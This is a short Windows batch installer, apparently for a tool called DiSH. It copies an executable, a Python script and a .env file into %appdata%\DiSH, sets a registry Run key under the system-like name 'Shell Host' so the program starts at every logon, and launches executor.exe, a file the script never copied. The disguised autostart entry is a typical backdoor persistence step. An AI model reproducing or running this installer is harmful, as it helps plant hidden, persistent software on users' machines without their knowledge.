pip install -r requirements.txt
mkdir %appdata%\DiSH
copy DiSH.exe %appdata%\DiSH
copy main.py %appdata%\DiSH
copy .env %appdata%\DiSH
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /V "Shell Host" /t REG_SZ /F /D "%appdata%\DiSH\DiSH.exe"
echo starting...
start %appdata%\DiSH\executor.exe